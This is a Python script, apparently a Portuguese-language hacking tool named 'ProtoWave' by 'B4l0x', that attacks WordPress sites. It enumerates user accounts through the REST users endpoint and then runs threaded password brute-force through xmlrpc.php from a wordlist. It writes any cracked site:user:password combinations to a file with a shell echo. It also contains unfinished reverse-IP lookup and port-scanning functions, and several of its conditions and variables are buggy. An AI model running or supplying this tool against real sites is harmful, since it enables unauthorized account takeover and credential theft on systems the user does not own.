#!/usr/bin/python
#coding: utf-8

import threading
import urllib2
import urllib
import json
import requests
import argparse as arg
import sys
import os
import time
import socket

print(''' 
    ____             __      _       __
   / __ \_________  / /_____| |     / /___ __   _____ 
  / /_/ / ___/ __ \/ __/ __ \ | /| / / __ `/ | / / _ \

 / ____/ /  / /_/ / /_/ /_/ / |/ |/ / /_/ /| |/ /  __/
/_/   /_/   \____/\__/\____/|__/|__/\__,_/ |___/\___/ 
 v1.1

[!] Brute/Scanner cms (wordpress)
[!] Scanner de portas 21,23,80,445,3306 - Disponivel na versao 2.0
[!] Mass brute force - Disponivel na versao 2.0
[!] Reverse ip domain - Em desenvolvimento
[!] Desenvolvido por ./Cryptonking (B4l0x)
''')

parser = arg.ArgumentParser(description="Wordpress brute/scan by B4l0x")
parser.add_argument("--site","-s", help="Site wordpress", required=True, type=str)
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas", required=True, default="wordlist.txt", type=str)
parser.add_argument("--usuario", "-u", help="Usuario alvo", default="null", required=False, type=str)
parser.add_argument("--sleep", "-slp", default="4", help="Time sleep usado no Thread", required=False, type=int)
x = parser.parse_args()

site = x.site
site.replace("https://", "http://")
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 'Cookie': 'humans_21909=1'}
usuarios = []
wpok = []
reverseip = []
confirmado= []
tempo = time.strftime("%H:%M:%S")

def verwp():
        try:
                print("[{} INFO] Confirmando site wordpress...").format(tempo)
                try:
                        response = requests.get(site+"/xmlrpc.php", timeout=10, headers=header).text
                        logins = requests.get(site+"/wp-json/wp/v2/users", timeout=10, headers=header).text
                except requests.ConnectionError:
                        print("[{} INFO] Host nao pode ser resolvido").format(tempo)
                        exit()
                except Exception as e:
                        print("[{} INFO] Host nao pode ser resolvido erro: {}").format(tempo, e)
                        exit()
                if "XML-RPC server accepts POST requests only." in response:
                        print("[{} INFO] URL {} [XMLRPC] [OK]").format(tempo,site)
                        if "slug" in logins:
                                print("[{} INFO] URL {} [LOGIN] [OK]").format(tempo,site)
                                confirmado.append("1")
                                wpok.append(site)
                elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                                print("[{} INFO] URL {} [XMLRPC Bloqueado]").format(tempo,site)
                                print(response)
                                exit()
        except KeyboardInterrupt:
                        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                        exit()
        except requests.ConnectionError:
                        print("[{} INFO] Host nao pode ser resolvido").format(tempo)
                        exit()
        except Exception as e:
                        print("[{} INFO] Host nao pode ser resolvido erro: {}").format(tempo, e)
                        exit()

def capturausuarios():
        try:
                if confirmado[0] != "":
                        try:
                                print("[{} INFO] Inciando busca de usuario(s)...").format(tempo)
                                for site in wpok:
                                        response = requests.get(site+"/wp-json/wp/v2/users", timeout=5, headers=header).text
                                        if "slug" in response:
                                                dados = json.loads(response)
                                                print("\n[{} INFO] URL {}").format(tempo,site)
                                                for user in dados[0:40]:
                                                        print("[{} INFO] Usuario(s) encontrado(s): {}").format(tempo,user['slug'])
                                                        usuarios.append(user['slug'])
                                        elif not "slug" in response:
                                                        print("[{} INFO] Nao foi possivel encontrar usuario(s) nessa url: {}").format(tempo,url)
                        except KeyboardInterrupt:
                                        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                        except:
                                print("[{} INFO] Erro ao obter usuarios, seu teste sera inciado usando admin").format(tempo)
                                usuarios.append('admin')
                                return capturausuarios
        except:
                print("[{} INFO] Falha ao confirmar site wordpress...").format(tempo)
                exit()
def brute(i):
        try:
                ii = i.replace("\n", "")
                for usuario in usuarios:
                        for site in wpok:
                                xml='''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>'''%(usuario,ii)
                                response = requests.get(site+"/xmlrpc.php", timeout=10, headers=header).text
                                r = requests.post(site+"xmlrpc.php", data=xml, timeout=30, headers=header).text
                                if "XML-RPC server accepts POST requests only." in response:
                                        if 'isAdmin' in r:
                                                print("\n\t[{} INFO] URL: {} <=> {}:{} [LOGIN EFETUADO COM SUCESSO]\n").format(tempo,site,usuario,ii)
                                                os.system(str("echo {}:{}:{} >> {}").format(site,usuario,ii,"cracked.txt"))
                                                break
                                        elif 'faultString' in r:
                                                #print(r)
                                                print("[{} INFO] URL: {} <=> {}:{} [Login Falhou]").format(tempo,site,usuario,ii)
                                        elif 'Not Acceptable!' in r:
                                                print("[{} INFO] URL: {} [Firewall]").format(tempo,site)
                                                exit()
                                                break
                                        else:
                                                continue
                                elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                                        print("[{} INFO] URL {} [XMLRPC Bloqueado]").format(tempo,site)
                                        exit()
                                        
        except KeyboardInterrupt:
                        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
                        exit()
        except Exception as e:
                print("[{} INFO] Conexao perdida com o host, Reconectando...").format(tempo)
                exit()

def apireverse():
        try:
                total=1
                contador=0
                while contador < total:
                        sites = open(x.lista, 'r').readlines()
                        tempo = time.strftime("%H:%M:%S")
                        print("[{} INFO] Reverse IP domain").format(tempo)
                        for site in sites:
                                url = site.replace("\n", "")
                                url2 = url.replace("http://", "")
                                url3 = url2.replace("/", "")
                                captura = requests.get("https://api.hackertarget.com/reverseiplookup/?q="+url3, headers=header).content
                                for cap in reverseip:
                                        cap1 = str(("http://"+cap+"/"))
                                        reverseip.append(cap1)
                                        print(cap1)
                                        contador=contador+1
        except:
                print("[{} INFO] Erro ao obter sites no reverse ip \n").format(tempo)

def plugintema():
        try:
                print("[{} INFO] Iniciando scan de plugin(s) e tema(s)...").format(tempo)
                plugins=[]
                temas=[]
        except:
                print("[{} INFO] Erro ao testar plugin(s) e tema(s)").format(tempo)
                exit()

def portscan():
        print("\n[{} INFO] Iniciando scan de porta(s)...").format(tempo)
        try:
                sites = open(x.lista, 'r').readlines()
                for site in sites:
                        url1 = site.replace("\n", "")
                        url2 = url1.replace("http://", "")
                        url = url2.replace("/", "")
                        if (url and x.porta):
                                try:
                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        s.settimeout(2)
                                        c = s.connect_ex((str(url),int(x.porta)))
                                        if c == 0:
                                                print("[{} INFO] {} Porta "+str(x.porta)+" Aberta").format(tempo,url)
                                        else:
                                                print("[{} INFO] {} Porta "+str(x.porta)+" Fechada").format(tempo,url)
                                except socket.gaierror:
                                        print("[{} INFO] Host não pode ser resolvido").format(tempo)
                                        continue
                                except socket.error:
                                        print("[{} INFO] Socket error!").format(tempo)
                                        continue
        except:
                print("[{} INFO] Erro ao procurar por porta(s) no servidor").format(tempo)


#apireverse()
#portscan()                
verwp()
#plugintema()
print("")
if x.usuario == "null":
        capturausuarios()
else:
        wpok.append(site)
        confirmado.append("1")
        usuarios.append(x.usuario)
        print("[{} INFO] Brute force sera inciado usando login {}").format(tempo,x.usuario)
print("")
try:
        try:
                wordlist = open(x.wordlist, 'r').readlines()
        except:
                print("[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
                exit()
        for i in wordlist:
                time.sleep(0.+x.sleep)
                t1 = threading.Thread(target=brute, args=(i,))
                t1.start()
except KeyboardInterrupt:
                        print("\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n").format(tempo)
                        exit()
